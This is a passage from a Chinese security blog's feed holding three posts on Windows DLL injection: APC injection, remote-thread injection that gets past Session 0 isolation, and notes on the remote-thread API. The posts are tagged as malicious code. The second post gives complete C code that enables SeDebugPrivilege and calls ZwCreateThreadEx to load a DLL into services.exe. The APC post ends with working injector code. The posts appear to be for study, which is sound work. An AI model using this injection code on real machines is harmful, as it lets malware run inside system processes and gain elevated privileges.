class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        pLoadLibraryFunc = <span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>        <span class="hljs-keyword">if</span> (pLoadLibraryFunc == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br>            flag = FALSE;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">//向所有的线程插入APC函数</span><br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; dwThreadLength; i++) &#123;<br>            hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, FALSE, pThreadId[i]);<br>            <span class="hljs-keyword">if</span> (hThread) &#123;<br>                <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress);<br>                <span class="hljs-built_in">CloseHandle</span>(hThread);<br>                hThread = <span class="hljs-literal">NULL</span>;<br>            &#125;<br>        &#125;<br>        flag = TRUE;<br>    &#125; <span class="hljs-keyword">while</span> (FALSE);<br>    <span class="hljs-keyword">if</span> (hProcess) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>        hProcess = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (pThreadId) &#123;<br>        <span class="hljs-keyword">delete</span>[]pThreadId;<br>        pThreadId = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL flag=<span class="hljs-built_in">Inject</span>(<span class="hljs-string">&quot;自己的文件路径&quot;</span>);<br>    <span class="hljs-keyword">if</span> (flag == TRUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CTestApcDlg::OnBnClickedOk</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 在此添加控件通知处理程序代码</span><br><span class="hljs-built_in">SleepEx</span>(<span class="hljs-number">10000</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//CDialogEx::OnOK();</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/1.png"></p><p>然后打开我们的注入程序，看到提示已经注入成功。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/2.png"></p><p>点击确定按钮，就会弹出我们在DLL里写好的弹窗。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/3.png"></p><p>使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-突破session 0隔离的远线程注入</title>
    <link href="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="SESSION-0隔离"><a href="#SESSION-0隔离" class="headerlink" title="SESSION 0隔离"></a>SESSION 0隔离</h4><p>在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。</p><p>在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。</p><p>但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。</p><p>ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;processthreadsapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlconv.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;atlstr.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateRemoteThreadInject</span><span class="hljs-params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;<br><span class="hljs-comment">//提升权限</span><br>HANDLE hToken;<br><span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开近访问令牌失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>LUID luid;<br><span class="hljs-keyword">if</span> (LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;luid) == <span class="hljs-literal">false</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;查看特权信息失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>TOKEN_PRIVILEGES tkp;<br>tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>tkp.Privileges[<span class="hljs-number">0</span>].Luid = luid;<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="hljs-keyword">sizeof</span>(tkp), <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;调节权限失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br>LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;<br>FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取注入进程句柄</span><br>hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>dwSize = lstrlen(pszDllFileName) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//printf(&quot;dwSize:%d\n&quot;, dwSize);</span><br><span class="hljs-comment">//申请内存</span><br>pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (pDllAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//向申请的内存写入数据</span><br>BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (WriteFlag == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HMODULE hNtdll = LoadLibrary(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取NTDLL地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取loadlibrary</span><br>pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><span class="hljs-keyword">if</span> (pFuncProcAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG CreateThreadFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T ZeroBits,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T StackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">SIZE_T MaximumStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID pUnkown)</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwCreateThreadEx)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">PHANDLE ThreadHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">ACCESS_MASK DesiredAccess,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID ObjectAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">BOOL CreateSuspended,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dw1,</span></span><br><span class="hljs-params"><span class="hljs-function">DWORD dw2,</span></span><br><span class="hljs-params"><span class="hljs-function">LPVOID pUnkown)</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwCreateThreadEx&quot;</span>);<br><span class="hljs-keyword">if</span> (ZwCreateThreadEx == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取ZW地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HANDLE hRemoteThread = <span class="hljs-literal">NULL</span>;<br>ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="hljs-literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hRemoteThread == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>CloseHandle(hProcess);<br>FreeLibrary(hNtdll);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">DWORD <span class="hljs-title">GetPID</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszProcessName)</span> </span>&#123;<br>HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>PROCESSENTRY32 pe = &#123; <span class="hljs-keyword">sizeof</span>(pe) &#125;;<span class="hljs-comment">//初始化</span><br>USES_CONVERSION;<br>CString ProcessName = A2T(pszProcessName);<br>BOOL flag = Process32First(hSnap, &amp;pe);<br><span class="hljs-keyword">while</span> (flag) &#123;<br><span class="hljs-keyword">if</span> (lstrcmp(pe.szExeFile, ProcessName) == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">return</span> pe.th32ProcessID;<br>&#125;<br>flag = Process32Next(hSnap, &amp;pe);<br>&#125;<br>CloseHandle(hSnap);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车开始注入\n&quot;</span>);<br>getchar();<br>DWORD dwPID = GetPID(<span class="hljs-string">&quot;services.exe&quot;</span>);<br><span class="hljs-keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="hljs-string">L&quot;C:\\Users\\b1ackie\\Desktop\\RemoteTest.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><p>打开程序，按下回车开始注入，显示注入成功</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>使用Process Explorer查看services.exe的导入模块</p><p><img src="/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-远程线程注入</title>
    <link href="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h4><p>远程线程注入是指一个进程在另一个进程中创建线程的技术。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h5><p>打开现有的本地进程对象</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HANDLE OpenProcess(<br>  DWORD dwDesiredAccess,<br>  BOOL  bInheritHandle,<br>  DWORD dwProcessId<br>);<br></code></pre></div></td></tr></table></figure><p>dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。</p><p>bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。</p><p>dwProcessId：要打开的本地进程PID。</p><p>返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。</p><h5 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h5><p>在指定进程的虚拟地址空间内保留、提交或更改内存的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">LPVOID VirtualAllocEx(<br>  HANDLE hProcess,<br>  LPVOID lpAddress,<br>  SIZE_T dwSize,<br>  DWORD  flAllocationType,<br>  DWORD  flProtect<br>);<br></code></pre></div></td></tr></table></figure><p>hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。</p><p>lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。</p><p>dwSize：要分配的内存大小，以字节为单位。</p><p>flAllocationType：内存分配类型。此参数必须为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>MEM_COMMIT<BR>0x00001000</BR></td><td>在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</td></tr><tr><td>MEM_RESERVE<BR>0x00002000</BR></td><td>保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置</td></tr><tr><td>MEM_RESET<BR>0x00080000</BR></td><td>表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。</td></tr><tr><td>MEM_RESET_UNDO<BR>0x1000000</BR></td><td>只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO</td></tr></tbody></table><p>flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值：</p><ul><li>PAGE_NOACCESS</li><li>PAGE_GUARD</li><li>PAGE_NOCACHE</li><li>PAGE_WRITECOMBINE</li></ul><p>返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。</p><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><p>在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">WriteProcessMemory</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE  hProcess,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID  lpBaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCVOID lpBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">  SIZE_T  nSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  SIZE_T  *lpNumberOfBytesWritten</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。</p><p>lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。</p><p>lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。</p><p>nSize：要写入指定进程的字节数。</p><p>lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。</p><p>返回值：如果函数成功，则返回值不为0；如果失败，则为0；</p><h5 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h5><p>创建一个在另一个进程的虚拟地址空间中运行的线程。</p><figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">HANDLE</span> CreateRemoteThread(<br>  <span class="hljs-keyword">HANDLE</span>                 hProcess,<br>  LPSECURITY_ATTRIBUTES  lpThreadAttributes,<br>  SIZE_T                 dwStackSize,<br>  LPTHREAD_START_ROUTINE lpStartAddress,<br>  LPVOID                 lpParameter,<br>  DWORD                  dwCreationFlags,<br>  LPDWORD                